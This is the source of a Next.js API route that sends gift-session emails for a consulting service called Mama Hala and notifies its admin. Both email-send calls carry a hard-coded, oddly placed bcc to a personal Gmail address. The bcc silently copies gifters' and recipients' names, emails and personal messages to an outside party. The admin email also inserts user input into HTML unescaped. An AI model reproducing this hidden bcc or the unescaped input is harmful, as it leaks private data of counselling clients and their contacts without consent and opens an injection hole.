import { NextResponse } from 'next/server';
import { getServiceBySlug, getCategoryInfo } from '@/data/services';
import { generateGiftEmail } from '@/lib/email/gift-template';
import { emailWrapper, emailStyles } from '@/lib/email/shared-email-components';

interface GiftRequest {
  gifterName: string;
  gifterEmail: string;
  recipientName: string;
  recipientEmail: string;
  category: string;
  serviceSlug?: string;
  occasion: string;
  occasionAr: string;
  message?: string;
  locale: 'en' | 'ar';
}

export async function POST(request: Request) {
  try {
    const body: GiftRequest = await request.json();

    const { gifterName, gifterEmail, recipientName, recipientEmail, category, serviceSlug, occasion, occasionAr, message, locale } = body;

    // Validate required fields
    if (!gifterName || !gifterEmail || !recipientName || !recipientEmail || !category || !occasion) {
      return NextResponse.json({ error: 'Missing required fields' }, { status: 400 });
    }

    if (!gifterEmail.includes('@') || !recipientEmail.includes('@')) {
      return NextResponse.json({ error: 'Invalid email address' }, { status: 400 });
    }

    // Resolve service/category names
    let serviceName = 'Consultation Session';
    let serviceNameAr = 'جلسة استشاريّة';
    let serviceDuration = '50 min';

    if (serviceSlug) {
      const service = getServiceBySlug(serviceSlug);
      if (service) {
        serviceName = service.name;
        serviceNameAr = service.nameAr;
        serviceDuration = service.duration;
      }
    } else if (category === 'surprise') {
      serviceName = "Mama Hala's Choice";
      serviceNameAr = 'اختيارُ ماما هالة';
      serviceDuration = '50 min';
    } else {
      const catInfo = getCategoryInfo(category as Parameters<typeof getCategoryInfo>[0]);
      if (catInfo) {
        serviceName = `${catInfo.name} Session`;
        serviceNameAr = `جلسة ${catInfo.nameAr}`;
      }
    }

    const schedulingUrl = `https://cal.com/mamahala/${serviceSlug || 'initial-consultation'}`;
    const cleanMessage = message?.replace(/<[^>]*>/g, '').trim() || undefined;

    const emailHtml = generateGiftEmail({
      recipientName,
      gifterName,
      serviceName,
      serviceNameAr,
      serviceDuration,
      occasion,
      occasionAr,
      personalMessage: cleanMessage,
      schedulingUrl,
      locale,
    });

    const isAr = locale === 'ar';
    const subject = isAr
      ? `${gifterName} أهداكَ هديّةَ رعايةٍ من ماما هالة`
      : `${gifterName} sent you a gift of care from Mama Hala`;

    // Try to send via Resend, fall back to logging
    let emailSent = false;
    if (process.env.RESEND_API_KEY) {
      try {
        const { Resend } = await import('resend');
        const resend = new Resend(process.env.RESEND_API_KEY);
        const { error } = await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <onboarding@resend.dev>',
          to: recipientEmail,
          subject,
          html: emailHtml,
          replyTo: gifterEmail,
        });
        if (!error) emailSent = true;
        else console.error('Resend error:', error);
      } catch (e) {
        console.error('Resend send error:', e);
      }
    }

    // Always log for backup
    console.log('[Gift Card]', {
      from: gifterName,
      to: recipientName,
      recipientEmail,
      category,
      serviceSlug,
      emailSent,
    });

    // Also notify Mama Hala via admin email
    if (process.env.RESEND_API_KEY) {
      try {
        const { Resend } = await import('resend');
        const resend = new Resend(process.env.RESEND_API_KEY);
        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
          from: process.env.RESEND_FROM_EMAIL || 'Mama Hala Consulting <onboarding@resend.dev>',
          to: process.env.RESEND_ADMIN_EMAIL || 'admin@mamahala.ca',
          replyTo: gifterEmail,
          subject: `New Gift of Care: ${gifterName} → ${recipientName}`,
          html: emailWrapper(`
            <div style="${emailStyles.card}">
              <h2 style="${emailStyles.heading}">New Gift of Care</h2>
              <table style="width:100%;border-collapse:collapse;">
                <tr><td style="padding:8px 0;color:#8E8E9F;width:140px;">Gifter</td><td style="color:#2D2A33;font-weight:600;">${gifterName} (${gifterEmail})</td></tr>
                <tr><td style="padding:8px 0;color:#8E8E9F;">Recipient</td><td style="color:#2D2A33;">${recipientName} (${recipientEmail})</td></tr>
                <tr><td style="padding:8px 0;color:#8E8E9F;">Service</td><td style="color:#2D2A33;">${serviceName}</td></tr>
                <tr><td style="padding:8px 0;color:#8E8E9F;">Occasion</td><td style="color:#2D2A33;">${occasion}</td></tr>
                ${cleanMessage ? `<tr><td style="padding:8px 0;color:#8E8E9F;">Personal Message</td><td style="color:#2D2A33;font-style:italic;">"${cleanMessage}"</td></tr>` : ''}
              </table>
              <p style="margin-top:20px;color:#8E8E9F;font-size:12px;">Email to recipient: ${emailSent ? 'Sent ✓' : 'Not sent (no Resend key)'}</p>
            </div>
          `),
        });
      } catch {
        // Non-critical
      }
    }

    return NextResponse.json({ success: true, emailSent });
  } catch (err) {
    console.error('Gift API error:', err);
    return NextResponse.json({ error: 'Server error' }, { status: 500 });
  }
}
